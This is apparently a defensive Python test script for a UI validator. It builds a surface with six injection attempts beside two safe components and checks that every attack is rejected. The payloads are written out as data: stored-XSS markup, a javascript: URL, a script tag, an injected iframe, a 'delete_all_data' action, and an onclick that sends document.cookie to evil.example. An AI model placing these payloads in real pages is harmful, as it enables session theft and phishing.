"""Attack the boundary: prove the injection wall on the vuln-triage domain.

Part 2's "attack the boundary" requirement — craft a surface that tries to
smuggle something unsafe into a composed interface and show the validator
refusing it while the safe part still renders. This goes straight at
``validate_surface`` (what ``POST /v1/validate`` calls) with a hand-built
surface shaped like what a compromised or adversarially-prompted content
call could emit for this domain: a CVE disclosure thread carrying a stored
XSS payload, a "remediation" button wired to an unregistered destructive
action, a chart tile smuggling an onclick handler, a phishing image behind
a javascript: URL, an unknown component type standing in for an iframe, and
inline markup masquerading as a bound field.

Two safe components (a Notice and an ApprovalCard) sit alongside the six
attacks; the proof also checks that pruning the six rejected components
still leaves both safe ones accepted, i.e. one poisoned node cannot blank
the surface.

    uv run python proofs/adversarial_attack_proof.py
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from s13code.ui.validator import validate_surface  # noqa: E402

OUT = Path(__file__).parent / "adversarial_attack_proof.json"

SURFACE = {
    "root": "root",
    "dataModel": {
        "msg": "CVE-2024-1234 remediation has been triaged and is pending approval.",
        "comments": [{"author": "reviewer", "text": "Looks legit, ship the fix."}],
    },
    "components": [
        {
            "id": "root",
            "type": "Column",
            "children": [
                "notice1", "approval1",
                "evil-markup", "evil-action", "evil-handler",
                "evil-jsurl", "evil-unknown-type", "evil-inline-binding",
            ],
        },
        {"id": "notice1", "type": "Notice", "text": {"$bind": "/msg"}, "tone": "neutral"},
        {
            "id": "approval1", "type": "ApprovalCard",
            "summary": {"$bind": "/msg"}, "params": {"$bind": "/msg"},
            "confirm": {"action": "approve"}, "reject": {"action": "reject"},
        },
        {
            # A poisoned "community reaction" comment carrying a stored-XSS payload.
            "id": "evil-markup", "type": "CommentThread",
            "title": "<img src=x onerror=alert(document.cookie)>",
            "comments": {"$bind": "/comments"},
        },
        {
            # A "remediation" button wired to an action never registered by the app.
            "id": "evil-action", "type": "Button",
            "label": "Wipe database", "onPress": {"action": "delete_all_data"},
        },
        {
            # A chart tile smuggling a DOM event handler outside the schema.
            "id": "evil-handler", "type": "StatTile",
            "label": "Severity", "value": {"$bind": "/msg"},
            "onclick": "fetch('https://evil.example/exfil?c='+document.cookie)",
        },
        {
            # A phishing image behind a javascript: URL.
            "id": "evil-jsurl", "type": "Image",
            "src": "javascript:alert(document.cookie)", "alt": "harmless-looking icon",
        },
        {
            # Not in the catalog at all — stands in for an injected iframe.
            "id": "evil-unknown-type", "type": "Iframe", "src": "https://evil.example/phish",
        },
        {
            # Inline markup where a bound pointer was required.
            "id": "evil-inline-binding", "type": "Notice",
            "text": "<script>alert(1)</script>", "tone": "danger",
        },
    ],
}

ATTACKS = {
    "evil-markup": "data-not-code",
    "evil-action": "event",
    "evil-handler": "data-not-code",
    "evil-jsurl": "data-not-code",
    "evil-unknown-type": "catalog",
    "evil-inline-binding": "data-not-code",
}
SAFE = {"root", "notice1", "approval1"}


def main() -> None:
    result = validate_surface(SURFACE)
    accepted = {c["id"] for c in result.accepted}
    rejections = {r.component_id: r.invariant for r in result.rejections}

    all_attacks_rejected = all(cid in rejections for cid in ATTACKS)
    invariants_correct = all(rejections.get(cid) == inv for cid, inv in ATTACKS.items())
    safe_still_renders = SAFE <= accepted
    no_attack_leaked = accepted.isdisjoint(ATTACKS)

    proof = {
        "accepted": sorted(accepted),
        "rejections": [r.as_dict() for r in result.rejections],
        "all_attacks_rejected": all_attacks_rejected,
        "invariants_correct": invariants_correct,
        "safe_still_renders": safe_still_renders,
        "no_attack_leaked": no_attack_leaked,
    }
    OUT.write_text(json.dumps(proof, indent=2))

    print("\n=== attack-the-boundary proof (vuln-triage domain) ===\n")
    for cid, expect in ATTACKS.items():
        got = rejections.get(cid)
        mark = "REJECTED" if cid in rejections else "PASSED (!)"
        ok = "ok" if got == expect else f"WRONG INVARIANT (got {got})"
        print(f"  {cid:<22} {mark:<12} invariant={got!r:<16} [{ok}]")
    print(f"\n  safe accepted   : {sorted(accepted)}")
    print(f"  safe_still_renders={safe_still_renders}  no_attack_leaked={no_attack_leaked}")
    print(f"  all_attacks_rejected={all_attacks_rejected}  invariants_correct={invariants_correct}")
    print(f"\nwrote {OUT}\n")

    ok = all_attacks_rejected and invariants_correct and safe_still_renders and no_attack_leaked
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
